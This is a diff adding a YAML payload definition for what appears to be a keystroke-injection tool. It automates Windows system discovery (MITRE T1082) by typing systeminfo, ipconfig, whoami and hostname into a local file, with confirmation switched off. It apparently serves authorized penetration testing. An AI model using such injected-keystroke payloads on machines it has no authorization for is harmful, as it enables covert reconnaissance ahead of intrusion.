@@ -1,0 +1,60 @@
+name: system-info
+description: "Collects OS version, hostname, IP addresses, and current user information for system enumeration"
+author: TiltedLunar123
+version: "1.0"
+mitre:
+  tactic: Discovery
+  technique: T1082
+platform: windows
+parameters:
+  - name: output_file
+    type: string
+    default: "sysinfo.txt"
+    description: "Filename to write collected system information to"
+  - name: delay_ms
+    type: integer
+    default: 500
+    description: "Delay in milliseconds between keystrokes"
+safety:
+  requires_confirmation: false
+  scope_note: "Only use on systems you own or have written authorization to test"
+script: |
+  REM -----------------------------------------------
+  REM System Information Discovery (T1082)
+  REM Collects OS version, hostname, IP config, and
+  REM current user details via built-in Windows tools
+  REM WARNING: Authorized use only
+  REM -----------------------------------------------
+  DELAY {{ delay_ms }}
+  GUI r
+  DELAY 500
+  STRING cmd /k
+  ENTER
+  DELAY 500
+  DELAY {{ delay_ms }}
+  STRING echo === System Info === > {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING systeminfo >> {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING echo === IP Configuration === >> {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING ipconfig /all >> {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING echo === Current User === >> {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING whoami /all >> {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING echo === Hostname === >> {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING hostname >> {{ output_file }}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING exit
+  ENTER
